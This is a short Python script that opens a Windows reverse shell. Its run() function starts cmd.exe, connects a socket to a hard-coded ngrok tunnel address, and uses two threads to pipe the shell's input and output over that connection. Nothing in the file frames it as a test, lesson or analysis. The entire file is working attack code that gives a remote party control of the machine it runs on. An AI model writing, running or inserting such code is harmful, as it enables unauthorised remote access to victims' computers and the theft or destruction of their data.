import socket,os as os,threading
import subprocess as sp

def run(host:str="0.tcp.in.ngrok.io", port:int=15320):
    p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
    s=socket.socket();s.connect((host,port))
    def c2s():
        while True:
            o=os.read(p.stdout.fileno(),1024)
            s.send(o)
    def s2c():
        while True:
            i=s.recv(1024)
            os.write(p.stdin.fileno(),i)

    threading.Thread(target=c2s).start()
    threading.Thread(target=s2c).start()

